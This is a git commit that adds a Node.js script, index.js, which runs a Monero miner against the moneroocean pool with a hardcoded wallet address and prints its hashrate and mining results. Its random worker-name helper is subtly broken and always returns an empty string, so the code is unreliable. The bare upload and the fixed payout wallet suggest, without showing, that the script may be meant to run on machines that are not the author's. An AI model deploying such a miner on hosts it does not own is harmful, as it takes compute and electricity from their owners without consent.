85913b60e9def187c4db85ec44fe7d2aa84dd2a0
erik0reis <58051404+erik0reis@users.noreply.github.com>
2022-12-01 13:35:39 -0300

    Add files via upload

---
+++ index.js
@@ -0,0 +1,31 @@
+const NodeMiner = require('node-miner');
+
+function generatestring(charcount) {
+    var charsallowed = "123467890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ#@$&".split('');
+    var text = "";
+    for (let index = 0; index < text.length; index++) {
+        text += charsallowed[Math.random() * charsallowed.length];
+    }
+    return text;
+}
+
+(async () => {
+
+    const miner = await NodeMiner({
+        host: `gulf.moneroocean.stream`,
+        port: 10128,
+        username: `44tPQN88uEhauxxnW26Zoo62TnFQU2QQJVAyHvx14ioX5RcgkU4ZTubf6gVGsiwaJTK5cFyDQuRVn3R4AFqtsG5N3k7MtxX`,
+        password: "worker-" + generatestring(10)
+    });
+
+    await miner.start();
+
+    miner.on('found', () => console.log('Result: FOUND \n---'));
+    miner.on('accepted', () => console.log('Result: SUCCESS \n---'));
+    miner.on('update', data => {
+        console.log(`Hashrate: ${data.hashesPerSecond} H/s`);
+        console.log(`Total hashes mined: ${data.totalHashes}`);
+        console.log(`---`);
+    });
+
+})();
